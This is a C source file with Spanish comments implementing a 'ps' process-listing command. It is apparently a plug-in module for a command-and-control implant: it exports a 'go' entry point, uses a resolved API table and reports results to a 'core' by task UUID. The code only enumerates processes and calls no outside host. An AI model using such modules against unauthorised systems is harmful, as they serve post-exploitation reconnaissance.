/**
 * Muestra los procesos del sistema
 * 82 - 0x52
 * CreateToolhelp32Snapshot + Process32FirstW/Process32NextW
 */

#include <stdint.h>
#include <winsock2.h>
#include <windows.h>
#include "api_table.h"
#include "parser.h"
#include "module_helpers.h"

void go(ApiTable* api, const char* task_uuid, Param* params, uint32_t param_count) {

    /* Buffer de salida */
    char* out = (char*)api->malloc(OUT_BUF_SIZE);
    if (!out) return;
    size_t used = 0;

    // ps
    if (param_count > 0) {
        buf_append_str(out, &used, "ps: usage: ps\n");
        api->report_result(task_uuid, (const uint8_t*)out, used, 0x99);
        api->free(out);
        return;
    }

    /* Snapshot de procesos */
    HANDLE hSnapshot = api->CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        char err_str[12];
        u64_to_dec((uint64_t)api->GetLastError(), err_str);
        buf_append_str(out, &used, "ps: error al crear snapshot (error ");
        buf_append_str(out, &used, err_str);
        buf_append_str(out, &used, ")\n");
        api->report_result(task_uuid, (const uint8_t*)out, used, 0x99);
        api->free(out);
        return;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    buf_append_str(out, &used, "PID\tPPID\tThreads\tName\n");

    if (!api->Process32FirstW(hSnapshot, &pe)) {
        char err_str[12];
        u64_to_dec((uint64_t)api->GetLastError(), err_str);
        buf_append_str(out, &used, "ps: error al leer procesos (error ");
        buf_append_str(out, &used, err_str);
        buf_append_str(out, &used, ")\n");
        api->report_result(task_uuid, (const uint8_t*)out, used, 0x99);
        api->CloseHandle(hSnapshot);
        api->free(out);
        return;
    }

    do {
        char num[12];
        char name_utf8[520];

        /* PID */
        u64_to_dec((uint64_t)pe.th32ProcessID, num);
        buf_append_str(out, &used, num);
        buf_append_str(out, &used, "\t");

        /* PPID */
        u64_to_dec((uint64_t)pe.th32ParentProcessID, num);
        buf_append_str(out, &used, num);
        buf_append_str(out, &used, "\t");

        /* Threads */
        u64_to_dec((uint64_t)pe.cntThreads, num);
        buf_append_str(out, &used, num);
        buf_append_str(out, &used, "\t");

        /* Nombre */
        api->WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1,
                                 name_utf8, sizeof(name_utf8), NULL, NULL);
        buf_append_str(out, &used, name_utf8);
        buf_append_str(out, &used, "\n");

    } while (api->Process32NextW(hSnapshot, &pe));

    api->CloseHandle(hSnapshot);

    /* Reportar al core */
    api->report_result(task_uuid, (const uint8_t*)out, used, 0x95);
    api->free(out);
}
